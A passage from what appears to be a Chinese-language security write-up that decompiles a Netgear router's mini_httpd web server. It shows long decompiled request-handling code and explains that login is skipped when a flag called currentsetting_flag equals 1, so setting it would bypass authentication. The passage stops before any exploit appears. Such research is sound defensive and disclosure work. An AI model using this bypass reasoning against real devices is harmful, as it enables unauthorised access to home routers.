<span class="number">2</span>;</span><br><span class="line">    v169 = <span class="built_in">strlen</span>(v170 + <span class="number">2</span>);</span><br><span class="line">    memmove(v171, src, v169 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v162 + <span class="number">1</span>, <span class="string">&quot;../&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v172 = <span class="built_in">strlen</span>(v162 + <span class="number">4</span>);</span><br><span class="line">      v173 = (v162 + <span class="number">1</span>);</span><br><span class="line">      v174 = (v162 + <span class="number">4</span>);</span><br><span class="line">LABEL_473:</span><br><span class="line">      memmove(v173, v174, v172 + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v175 = <span class="built_in">strstr</span>(v162 + <span class="number">1</span>, <span class="string">&quot;/../&quot;</span>);</span><br><span class="line">  v176 = v175 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v175 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = v176 &lt; v163; !k &amp;&amp; *v176 != <span class="number">47</span>; k = v176 &lt; v163 )</span><br><span class="line">      --v176;</span><br><span class="line">    v235 = v176;</span><br><span class="line">    src = v175 + <span class="number">4</span>;</span><br><span class="line">    v172 = <span class="built_in">strlen</span>(v175 + <span class="number">4</span>);</span><br><span class="line">    v174 = src;</span><br><span class="line">    v173 = (v235 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_473;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_478:</span><br><span class="line">  v179 = <span class="built_in">strlen</span>(v162 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v179 &gt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v178 = (v163 + v179 - <span class="number">3</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((v163 + v179 - <span class="number">3</span>), <span class="string">&quot;/..&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v178 &gt;= v163 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v178 == <span class="number">47</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *v178 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_478;</span><br><span class="line">        &#125;</span><br><span class="line">        --v178;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v162[<span class="number">1</span>] )</span><br><span class="line">    dword_42C880 = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">  v180 = dword_42C880;</span><br><span class="line">  v181 = *dword_42C880;</span><br><span class="line">  <span class="keyword">if</span> ( v181 == <span class="number">47</span> || v181 == <span class="number">46</span> &amp;&amp; *(dword_42C880 + <span class="number">1</span>) == <span class="number">46</span> &amp;&amp; (!*(dword_42C880 + <span class="number">2</span>) || *(dword_42C880 + <span class="number">2</span>) == <span class="number">47</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">400</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v20 = <span class="string">&quot;Illegal filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_42B620 )</span><br><span class="line">  &#123;</span><br><span class="line">    v182 = host;</span><br><span class="line">    <span class="keyword">if</span> ( !host )</span><br><span class="line">    &#123;</span><br><span class="line">      v222 = <span class="number">128</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getsockname(dword_42C86C, v230, &amp;v222) &gt;= <span class="number">0</span> )</span><br><span class="line">        v182 = ntoa(v230);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v182 = <span class="string">&quot;UNKNOWN_HOST&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_42C8A0 = v182;</span><br><span class="line">    v183 = v182;</span><br><span class="line">    <span class="keyword">for</span> ( l = dword_42C8A0; ; ++l )</span><br><span class="line">    &#123;</span><br><span class="line">      v185 = *l;</span><br><span class="line">      v160 = v185 != <span class="number">0</span>;</span><br><span class="line">      v186 = <span class="number">2</span> * v185;</span><br><span class="line">      <span class="keyword">if</span> ( !v160 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(_ctype_b + v186) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        *l = *(_ctype_tolower + v186);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_42CDF4, <span class="number">0x2710</span>u, <span class="string">&quot;%s/%s&quot;</span>, v183, v180);</span><br><span class="line">    dword_42C880 = byte_42CDF4;</span><br><span class="line">  &#125;</span><br><span class="line">  signal(<span class="number">14</span>, sub_408BE0);</span><br><span class="line">  alarm(<span class="number">0x12C</span>u);</span><br><span class="line">  v223 = stat64(dword_42C880, &amp;sb);</span><br><span class="line">  <span class="keyword">if</span> ( v223 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v187 = dword_42C880;</span><br><span class="line">    <span class="keyword">for</span> ( dword_42C884 = v187 + <span class="built_in">strlen</span>(dword_42C880); ; *dword_42C884 = <span class="number">47</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v188 = dword_42C880;</span><br><span class="line">      v189 = dword_42C884;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_42C880 &gt;= --v189 )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_42C884 = <span class="number">0</span>;</span><br><span class="line">          v190 = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_508;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *v189 != <span class="number">47</span> );</span><br><span class="line">      dword_42C884 = v189;</span><br><span class="line">      *v189 = <span class="number">0</span>;</span><br><span class="line">      v190 = stat64(v188, &amp;sb);</span><br><span class="line">      <span class="keyword">if</span> ( v190 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++dword_42C884;</span><br><span class="line">LABEL_508:</span><br><span class="line">    v223 = v190;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v223 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_545;</span><br><span class="line">  <span class="keyword">if</span> ( (!dword_42C8B4 || !*dword_42C8B4) &amp;&amp; dword_42C880 )</span><br><span class="line">  &#123;</span><br><span class="line">    v229[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    v191 = nvram_get(<span class="string">&quot;product_name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v191 )</span><br><span class="line">      v191 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(v229, <span class="number">0x18</span>u, <span class="string">&quot;NETGEAR_%s.cfg&quot;</span>, v191);</span><br><span class="line">    v192 = <span class="built_in">strcmp</span>(dword_42C880, v229);</span><br><span class="line">    v17 = <span class="number">403</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v192 )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">      v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;HTML is illegal.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v193 = dword_42C880;</span><br><span class="line">  v194 = v193 + <span class="built_in">strlen</span>(dword_42C880);</span><br><span class="line">  <span class="keyword">if</span> ( (dword_433B70 &amp; <span class="number">0xF000</span>) == <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(v194 - <span class="number">1</span>) != <span class="number">47</span> &amp;&amp; !dword_42C884 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *dword_42C888 )</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/?%s&quot;</span>, path, dword_42C888);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/&quot;</span>, path);</span><br><span class="line">      v17 = <span class="number">302</span>;</span><br><span class="line">      v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      v19 = v230;</span><br><span class="line">      v20 = <span class="string">&quot;Directories must end with a slash.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">    v196 = v224;</span><br><span class="line">    <span class="keyword">while</span> ( v196 != &amp;v225 )</span><br><span class="line">    &#123;</span><br><span class="line">      src = dword_42C880;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dword_42C880, <span class="string">&quot;./&quot;</span>) )</span><br><span class="line">        <span class="built_in">snprintf</span>(v229, <span class="number">0x2710</span>u, <span class="string">&quot;%s&quot;</span>, *v196);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v229, <span class="number">0x2710</span>u, <span class="string">&quot;%s%s&quot;</span>, src, *v196);</span><br><span class="line">      <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">      &#123;</span><br><span class="line">        v196 += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v196 += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( stat64(v229, &amp;sb) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_42C880 = v229;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_535;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/http_disable_lan&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v198 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">      v199 = inet_network(v198);</span><br><span class="line">      v200 = nvram_get(<span class="string">&quot;lan_netmask&quot;</span>);</span><br><span class="line">      v202 = inet_network(v200);</span><br><span class="line">      v201 = inet_network(remote_ip);</span><br><span class="line">      v17 = <span class="number">503</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((v201 ^ v199) &amp; v202) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = <span class="string">&quot;The Share is not available&quot;</span>;</span><br><span class="line">LABEL_543:</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v203 = sc_usb_mounted(v17);</span><br><span class="line">    v17 = <span class="number">503</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v203 )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="string">&quot;No Shares Available&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_543;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_42C884 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">        usb_auth_check(dword_42C880);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        maybe_login(dword_42C880);</span><br><span class="line">      sub_4085DC();</span><br><span class="line">      <span class="keyword">if</span> ( !is_usb_session || (v204 = is_readable(dword_42C880, <span class="string">&quot;&quot;</span>), v17 = <span class="number">403</span>, v204) )</span><br><span class="line">      &#123;</span><br><span class="line">        v232 = scandir64(dword_42C880, &amp;v219, <span class="number">0</span>, &amp;alphasort64);</span><br><span class="line">        <span class="keyword">if</span> ( v232 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          strlcpy(v228, dword_42C880, <span class="number">769</span>);</span><br><span class="line">          src = dword_42C880;</span><br><span class="line">          v222 = <span class="number">0</span>;</span><br><span class="line">          v206 = encode_buf(v228);</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v230,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;&lt;!DOCTYPE html PUBLIC \&quot;-//W3C//DTD HTML 4.01 Transitional//EN\&quot; \&quot;http://www.w3.org/TR/html4/loose.dtd\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;&lt;html&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;meta http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html;charset=UTF-8\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;Index of %s&lt;/title&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;/head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;body bgcolor=\&quot;#99cc99\&quot; text=\&quot;#000000\&quot; link=\&quot;#2020ff\&quot; vlink=\&quot;#4040cc\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;h4&gt;Index of %s&lt;/h4&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;pre&gt;\n&quot;</span>,</span><br><span class="line">            src,</span><br><span class="line">            v206);</span><br><span class="line">          sub_40627C(&amp;v221, &amp;v222, &amp;v220, v230);</span><br><span class="line">          <span class="keyword">for</span> ( m = <span class="number">0</span>; m != v232; ++m )</span><br><span class="line">          &#123;</span><br><span class="line">            haystack = dword_42C880;</span><br><span class="line">            v208 = (*(v219 + <span class="number">4</span> * m) + <span class="number">19</span>);</span><br><span class="line">            v233 = *(v219 + <span class="number">4</span> * m);</span><br><span class="line">            <span class="built_in">snprintf</span>(byte_431CF4, <span class="number">0x7D0</span>u, <span class="string">&quot;%s/%s&quot;</span>, dword_42C880, v208);</span><br><span class="line">            <span class="keyword">if</span> ( !is_usb_session || is_readable(haystack, v208) )</span><br><span class="line">            &#123;</span><br><span class="line">              v210 = lstat64(byte_431CF4, v227);</span><br><span class="line">              v209 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v210 &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v211 = <span class="built_in">strcmp</span>(v208, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">                v209 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v211 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( !is_usb_session</span><br><span class="line">                    || (v227[<span class="number">3</span>] &amp; <span class="number">0xF000</span>) != <span class="number">40960</span></span><br><span class="line">                    || !*(v233 + <span class="number">19</span>)</span><br><span class="line">                    || (v212 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/USB_Storage&quot;</span>), v209 = <span class="string">&quot;&quot;</span>, !v212)</span><br><span class="line">                    &amp;&amp; (!<span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/&quot;</span>) || (v213 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;_Drive&quot;</span>), v209 = <span class="string">&quot;&quot;</span>, !v213)) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v208, <span class="string">&quot;..&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v214 = <span class="built_in">strcmp</span>(dword_42C880, <span class="string">&quot;shares/&quot;</span>);</span><br><span class="line">                      v209 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                      <span class="keyword">if</span> ( v214 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        sub_4079B0(v208);</span><br><span class="line">                        <span class="built_in">snprintf</span>(byte_431CF4, <span class="number">0x7D0</span>u, <span class="string">&quot;&lt;A HREF=\&quot;%s\&quot;&gt;[To Parent Directory]&lt;/A&gt;\n&quot;</span>, byte_4324C4);</span><br><span class="line">                        v209 = byte_431CF4;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      v215 = localtime(&amp;dword_433BA0);</span><br><span class="line">                      strftime(&amp;v225, <span class="number">0x3C</span>u, <span class="string">&quot;%A, %B %d, %Y  %l:%M %p&quot;</span>, v215);</span><br><span class="line">                      sub_4079B0(v208);</span><br><span class="line">                      v235 = &amp;unk_430000;</span><br><span class="line">                      strlcpy(&amp;unk_4328AC, v208, <span class="number">1531</span>);</span><br><span class="line">                      encode_buf(v235 + <span class="number">10412</span>);</span><br><span class="line">                      <span class="built_in">snprintf</span>(</span><br><span class="line">                        byte_431CF4,</span><br><span class="line">                        <span class="number">0x7D0</span>u,</span><br><span class="line">                        <span class="string">&quot;%-40s %14lld     &lt;A HREF=\&quot;%s\&quot;&gt;%s&lt;/A&gt;\n&quot;</span>,</span><br><span class="line">                        &amp;v225,</span><br><span class="line">                        v227[<span class="number">7</span>],</span><br><span class="line">                        byte_4324C4,</span><br><span class="line">                        v235 + <span class="number">10412</span>);</span><br><span class="line">                      v209 = byte_431CF4;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memset</span>(byte_431CF4, <span class="number">0</span>, <span class="keyword">sizeof</span>(byte_431CF4));</span><br><span class="line">              v209 = byte_431CF4;</span><br><span class="line">            &#125;</span><br><span class="line">            sub_40627C(&amp;v221, &amp;v222, &amp;v220, v209);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v230,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;    &lt;/pre&gt;\n\n    &lt;hr&gt;\n\n    &lt;address&gt;&lt;a href=\&quot;%s\&quot;&gt;%s&lt;/a&gt;&lt;/address&gt;\n  \n  &lt;/body&gt;\n\n&lt;/html&gt;\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;http://www.acme.com/software/mini_httpd/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mini_httpd/1.24 10May2016&quot;</span>);</span><br><span class="line">          sub_40627C(&amp;v221, &amp;v222, &amp;v220, v230);</span><br><span class="line">          sub_407BEC(<span class="number">200</span>, <span class="string">&quot;Ok&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html; charset=%s&quot;</span>, optlen_4);</span><br><span class="line">          <span class="keyword">if</span> ( dword_42C87C != <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *(v221 + v220) = <span class="number">0</span>;</span><br><span class="line">            sub_4062F0(v221);</span><br><span class="line">          &#125;</span><br><span class="line">          v197 = sub_407648;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_578;</span><br><span class="line">        &#125;</span><br><span class="line">        v205 = ntoa(&amp;client_addr);</span><br><span class="line">        syslog(<span class="number">6</span>, <span class="string">&quot;%.80s Directory \&quot;%.80s\&quot; is protected&quot;</span>, v205, path);</span><br><span class="line">        v17 = <span class="number">403</span>;</span><br><span class="line">        v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v20 = <span class="string">&quot;Directory is protected.&quot;</span>;</span><br><span class="line">LABEL_556:</span><br><span class="line">      send_error(v17, v18, v19, v20);</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_545:</span><br><span class="line">    v17 = <span class="number">404</span>;</span><br><span class="line">    v18 = &amp;unk_415C74;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_546;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( n = (v194 - <span class="number">1</span>); *n == <span class="number">47</span>; --n )</span><br><span class="line">    *n = <span class="number">0</span>;</span><br><span class="line">LABEL_535:</span><br><span class="line">  v197 = &amp;sub_40A154;</span><br><span class="line">LABEL_578:</span><br><span class="line">  v197();</span><br><span class="line">  <span class="keyword">return</span> (SSL_free)(dword_42C8C0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>比较两份代码，主要逻辑变化不大，但是新版中添加了 SSO 相关逻辑，即单点登录，猜测官方通过引入单点登录的手段对漏洞进行修复。</p>
<p>通过分析代码，可以定位到处理 login 请求的函数是 0x407FC0 (1.2.0.74)，关键片段如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">maybe_login</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v3)(<span class="type">const</span> <span class="type">char</span> *); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v6; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v10; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v11; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v12; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v16; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v18; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v19; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v20; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v21; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v23; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v24; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v25; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v28; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v29; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">char</span> *v31; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v33; <span class="comment">// $fp</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $a0</span></span><br><span class="line">  FILE *v38; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v41; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v42; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v43; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v44; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// $v0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">v46</span>;</span> <span class="comment">// [sp+20h] [-238h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v47[<span class="number">504</span>]; <span class="comment">// [sp+60h] [-1F8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( currentsetting_flag != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// logic when currentsetting_flag != 1</span></span><br><span class="line">  &#125;</span><br><span class="line">  v2 = check_lan_guest();</span><br><span class="line">  v3 = &amp;system;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="string">&quot;/bin/echo genie from wan, drop request &gt; /dev/console&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">&quot;/bin/echo genie from lan, ok &gt; /dev/console&quot;</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(current_remote_ip, <span class="number">58</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo genie ipv6, drop request &gt; /dev/console&quot;</span>);</span><br><span class="line">    v6 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="built_in">fprintf</span>(v6, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;auth_check&quot;</span>, <span class="number">3487</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(v6, <span class="string">&quot;current_remote_ip:%s\n&quot;</span>, current_remote_ip);</span><br><span class="line">    v4 = v6;</span><br><span class="line">    v3 = &amp;fclose;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3(v4);</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们观察到 login 函数开头对一个名为 currentsetting_flag 的标志位进行判断，如果不等于 1，就执行正常的 login 逻辑，否则会跳过 login 逻辑。最后对访客的 IP 地址进行判断，如果访客来自于公网，会丢弃相关请求。</p>
<p>那如果某处代码能控制这个变量为 1，就能绕过 login 直接访问后台内容。</p>
<p>通过交叉引用，在 handle_login 函数中找到了为这个变量赋值的位置</p>
